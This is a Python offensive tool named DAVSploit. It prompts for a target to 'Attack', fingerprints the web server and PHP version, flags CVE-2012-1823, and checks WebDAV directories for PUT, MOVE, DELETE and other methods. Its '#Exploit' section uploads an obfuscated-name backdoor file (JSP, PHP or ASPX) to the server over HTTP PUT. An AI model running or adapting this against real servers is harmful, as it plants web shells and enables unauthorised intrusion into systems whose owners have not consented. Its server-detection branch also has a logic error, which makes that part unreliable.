
import requests
from colorama import Fore
import sys

print(Fore.MAGENTA + """

╔╦╗╔═╗╦  ╦╔═╗┌─┐┬  ┌─┐┬┌┬┐
 ║║╠═╣╚╗╔╝╚═╗├─┘│  │ ││ │ 
═╩╝╩ ╩ ╚╝ ╚═╝┴  ┴─┘└─┘┴ ┴ """ + Fore.CYAN + """ Version 1.2
        
""" + Fore.RESET)

target = input("[" + Fore.YELLOW + "Target" + Fore.RESET + "] Enter IP or Domain name to Attack? ")

methods = ["PUT","MOVE","COPY","DELETE","PATCH","CONNECT","TRACE"]
dirs = ["/","/dav","/webdav","/WebDav"]
url = target

try:
    r = requests.get("http://" + url + "/",timeout=5)
    headers = r.headers
    php_version = headers['X-Powered-By']
except:
    print("[" + Fore.YELLOW + "Warning" + Fore.RESET + "] HTTP Server Unreachable")
    sys.exit()
    
print("[" + Fore.YELLOW + "Testing" + Fore.RESET + "] URL: http://" + url)
print("[" + Fore.YELLOW + "Webserver" + Fore.RESET + "] " + r.headers["Server"])
print("[" + Fore.YELLOW + "PHP Version" + Fore.RESET + "] " + php_version)
if '5.2.4' in php_version or '5.3.12' in php_version:
    print("[" + Fore.RED + "VULNERABLE" + Fore.RESET + "] PHP version vulnerable to " + Fore.RED + "CVE-2012-1823" + Fore.RESET)

print("[" + Fore.YELLOW + "Testing" + Fore.RESET + "] for webdav directories" + Fore.RESET + "")    
for directory in dirs:
    check_dav = requests.get("http://" + url + directory)
    check_dav_options = requests.options("http://" + url + directory)
    if '200' in str(check_dav.status_code):
        print("[" + Fore.GREEN + "Found" + Fore.RESET + "] " + directory + " Directory Found")
        
        if 'PUT' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows PUT Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] PUT Method not Accepted")
        if 'MOVE' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows MOVE Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] MOVE Method not Accepted")
        if 'COPY' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows COPY Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] COPY Method not Accepted")
        if 'DELETE' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows DELETE Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] DELETE Method not Accepted")
            
        if 'PATCH' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows PATCH Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] PATCH Method not Accepted")
        if 'CONNECT' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows CONNECT Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] CONNECT Method not Accepted")
        if 'TRACE' in str(check_dav_options.headers):
            print("[" + Fore.RED + "DANGEROUS" + Fore.RESET + "] Server Allows TRACE Method")
        else:
            print("[" + Fore.YELLOW + "Failed" + Fore.RESET + "] TRACE Method not Accepted")

        #Exploit
        if 'Coyote' in headers['Server']:
            backdoor = open("wsdjghtyur776.jsp","rb")
            file_name = 'wsdjghtyur776.jsp'
            
        elif 'Apache' or 'Nginx' in headers['Server']:
            backdoor = open("wsdjghtyur776.php","rb")
            file_name = 'wsdjghtyur776.php'
   
        elif 'Windows' in headers['Server']:
            backdoor = open("wsdjghtyur776.aspx","rb")
            file_name = 'wsdjghtyur776.aspx'
            
        elif len(headers['Server']) < 2:
             backdoor = open("index.html","rb")
             file_name = 'index.html'
             
        exploit = requests.put("http://" + url + directory + "/" + '' + file_name,headers={'Content-type': 'text/plain'},data=backdoor)
        if file_name + ' has been created' in str(exploit.text):
            print("[" + Fore.RED + "Exploit Successful" + Fore.RESET + "] " + file_name +  " File Uploaded")
        else:
            print("[" + Fore.YELLOW + "Exploit Failed" + Fore.RESET + "]" + " PUT Method not Allowed")   
